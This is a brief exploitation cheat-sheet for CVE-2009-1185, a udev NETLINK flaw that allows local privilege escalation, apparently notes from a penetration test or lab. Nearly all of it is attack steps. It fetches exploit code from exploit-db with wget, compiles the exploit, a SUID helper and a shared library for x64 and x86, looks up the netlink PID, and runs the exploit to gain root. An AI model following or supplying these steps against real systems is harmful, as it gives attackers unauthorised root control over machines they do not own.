# CVE-2009-1185-UDEV for x86


#PRIVESC


Udev before 1.4.1 does not verify whether a NETLINK message originates from kernel space, which allows local users to gain privileges by sending a NETLINK message from user space.

################Code Recap:


#For x64


wget https://www.exploit-db.com/raw/8478


gcc udev.c -o udev -m64


gcc -o program.o -c program.c -fPIC -m64


gcc -o suid suid.c -m64


gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles -m64



#For x86


wget https://www.exploit-db.com/raw/8478


gcc udev.c -o udev -m32


gcc -o program.o -c program.c -fPIC -m32


gcc -o suid suid.c -m32


gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles -m32



#The exploit mentions that it runs against Netlink. To find our Netlink number we type: cat /proc/net/netlink. 
cat /proc/net/netlink

#What we're looking for is the PID in front of the group "ffffffff". In this case, my PID displays 564

./udev 564

#ROOT ! (proof.png)
